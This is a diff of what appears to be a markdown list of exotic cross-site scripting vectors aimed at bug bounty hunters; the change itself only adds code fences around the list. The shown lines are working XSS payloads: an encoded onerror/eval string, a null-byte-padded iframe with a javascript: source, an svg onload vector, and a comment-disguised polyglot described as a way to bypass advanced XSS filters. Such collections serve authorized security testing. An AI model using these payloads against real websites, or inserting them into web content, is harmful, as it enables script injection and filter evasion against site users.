@@ -5,7 +5,7 @@ THIS IS SPECIALLY FOR BUG BOUNTY HUNTERS AND SECURITY RESEARCHERS.
 I REQUEST TO CONTRIBUTE TO THE PROJECT BY INCLUDING ONLY HIGHLY EXOTIC XSS VECTORS.
 
 
-
+```
 onerror%3Deval%3Bthrow'%3Dalert%5Cx281%5Cx29'%3B
 
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
@@ -35,4 +35,4 @@ eval(a+b+c+d);
 <svg•onload=alert(1)>
 
 <!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //># //This payload is used to fool and bypass advanced xss filters by fooling as if it is comments.
-
+```
